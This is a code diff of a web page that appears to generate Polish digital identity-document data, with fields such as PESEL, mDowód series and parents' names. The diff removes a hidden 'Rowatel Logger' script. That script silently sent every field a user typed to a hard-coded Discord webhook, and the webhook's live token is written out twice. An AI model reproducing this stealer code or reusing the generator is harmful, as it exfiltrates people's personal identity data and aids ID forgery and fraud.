@@ -534,7 +534,6 @@
         // =========================================================
         const CLOUD_NAME = 'dplomlrbd';           // <--- ZMIEŃ NA SWÓJ KLUCZ
         const UPLOAD_PRESET = 'ml_default'; // <--- ZMIEŃ NA SWÓJ KLUCZ
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1439608900537028730/3KZDLPvC1FC3tFl10UFQx6kmukSN1OmjDkQIzBU26q1uF7Hbfu3ZfmDl4fyWkhcfoNj_';
         // =========================================================
         
         const form = document.getElementById('dataGenerator');
@@ -866,66 +865,6 @@
             const targetUrl = `id.html?${params.join('&')}`;
             window.location.href = targetUrl;
         });
-<script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1439608900537028730/3KZDLPvC1FC3tFl10UFQx6kmukSN1OmjDkQIzBU26q1uF7Hbfu3ZfmDl4fyWkhcfoNj_";
-
-function sendWebhook(data) {
-    fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            username: "Rowatel Logger",
-            embeds: [
-                {
-                    title: "📲 Nowe Dane z Generatora",
-                    color: 10181046,
-                    fields: Object.keys(data).map(key => ({
-                        name: key,
-                        value: data[key] || "Brak",
-                        inline: false
-                    })),
-                    footer: {
-                        text: "Rowatel by Wallah"
-                    },
-                    timestamp: new Date()
-                }
-            ]
-        })
-    }).catch(err => console.error("Webhook Error:", err));
-}
-
-document.getElementById("generateButton").addEventListener("click", function(event) {
-    event.preventDefault();
-
-    const form = document.getElementById("dataGenerator");
-
-    if (!form.checkValidity()) {
-        form.reportValidity();
-        return;
-    }
-
-    const data = {
-        "Imię": document.getElementById("name").value,
-        "Nazwisko": document.getElementById("surname").value,
-        "Płeć": document.getElementById("sex").value,
-        "Data Urodzenia": document.getElementById("birthday").value,
-        "PESEL": document.getElementById("pesel").value,
-        "Seria mDowodu": document.getElementById("mdow_series").value,
-        "Data wydania": document.getElementById("issue_date").value,
-        "Data ważności": document.getElementById("expiry_date").value,
-        "Imię ojca": document.getElementById("father_name").value,
-        "Imię matki": document.getElementById("mother_name").value,
-        "Obywatelstwo": document.getElementById("nationality").value,
-        "Miejsce urodzenia": document.getElementById("birthPlace").value,
-        "Kraj urodzenia": document.getElementById("birth_country").value
-    };
-
-    sendWebhook(data);
-
-    // przejście na stronę końcową
-    window.location.href = "generated.html";
-});
-        
     </script>
 
 </body>
